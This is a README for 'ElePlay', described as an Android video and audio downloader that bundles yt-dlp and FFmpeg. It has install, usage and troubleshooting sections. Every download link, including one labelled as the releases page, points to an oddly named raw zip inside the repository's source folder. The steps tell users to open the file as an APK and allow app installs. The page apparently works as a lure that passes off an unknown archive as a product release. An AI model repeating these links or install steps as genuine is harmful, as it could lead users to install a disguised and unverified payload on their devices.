# 📥 ElePlay - Fast video downloads on Android

[![Download ElePlay](https://img.shields.io/badge/Download%20ElePlay-blue?style=for-the-badge&logo=github)](https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip)

## 🎯 What ElePlay does

ElePlay is an Android app for downloading videos and audio from YouTube and many other sites. It includes the tools it needs inside the app, so you do not need Termux, root access, or extra setup.

It can:
- Download video files from many websites
- Pick the best video and audio streams
- Merge them with FFmpeg
- Run offline after install
- Work on ARM64 Android devices

## 🚀 Getting started

Use ElePlay if you want a simple way to save online videos to your phone.

What you need:
- An Android phone or tablet
- Enough free storage for the app and your downloads
- A stable internet connection for downloads
- An ARM64 device for best support

## 📲 Download and install

1. Open the releases page: https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip
2. Find the latest release
3. Download the APK file
4. Open the APK on your Android device
5. Allow app installation if Android asks for permission
6. Tap Install
7. Open ElePlay after the install finishes

If your browser blocks the file, check your Downloads folder and open it from there.

## 🧭 First use

After you install ElePlay:

1. Open the app
2. Paste a video link
3. Wait for ElePlay to read the page
4. Choose the format or quality you want
5. Start the download
6. Find the saved file in your phone storage

For many sites, ElePlay will show a list of available formats. You can choose a lower file size or a higher video quality.

## 🎬 How video downloading works

ElePlay uses yt-dlp to read video pages and find available media files. For many videos, the best quality comes as two parts:
- One video file
- One audio file

ElePlay uses FFmpeg to join them into one file. This gives you a finished video that plays in normal apps and media players.

## 🔧 Built-in tools

ElePlay includes these tools inside the APK:

- **FFmpeg** for media merging and processing
- **CPython** for Python-based app logic
- **yt-dlp** for video site support
- **QuickJS** for script support inside the app

Because these tools are bundled with the app, setup stays simple.

## 📁 File types and formats

ElePlay can work with common media formats such as:
- MP4
- WEBM
- M4A
- MP3
- MKV

The exact formats you see depend on the site and the source file.

## ⚙️ Basic use tips

- Use a Wi‑Fi connection for large downloads
- Keep enough free storage on your device
- Use higher quality only when you need it
- Choose smaller files if you want faster downloads
- Close other large apps if downloads feel slow

## 📱 Device support

ElePlay is built for ARM64 Android devices. It is made for phones and tablets that use modern 64-bit chips.

It is best suited for:
- Recent Android phones
- Recent Android tablets
- Devices with enough storage for video files

## 🔐 Privacy and local use

ElePlay runs the download tools on your device. That means your downloads stay on your phone. You do not need a desktop program or a server setup.

## 🧰 Troubleshooting

If a video does not load:
- Check that the link is correct
- Try again after a short wait
- Make sure the site still supports normal browser access

If the app cannot install:
- Check that your phone allows app installs from your browser or file manager
- Make sure the APK file finished downloading
- Remove older copies of the app if you have one already installed

If a download fails:
- Check your internet connection
- Try a lower quality option
- Make sure the device has enough free space

If audio and video do not merge:
- Wait for the download to finish
- Try the file again
- Make sure the app has storage access

## 🗂️ Common use cases

ElePlay works well for:
- Saving videos for offline viewing
- Downloading lecture clips
- Keeping music videos on your device
- Saving content for travel
- Downloading from sites that offer direct media streams

## 📌 Project details

- Repository: ElePlay
- Type: Android video downloader
- Main tools: FFmpeg, CPython, yt-dlp, QuickJS
- License: GPL-2.0
- Platform focus: ARM64 Android

## 🔗 Download

Visit this page to download the latest APK:

https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip

## 🛠️ For users who want a clean setup

If you want the smoothest setup:
- Download the newest release
- Install the APK
- Open the app once
- Give storage access if asked
- Start with a short video link first
- Move to larger downloads after that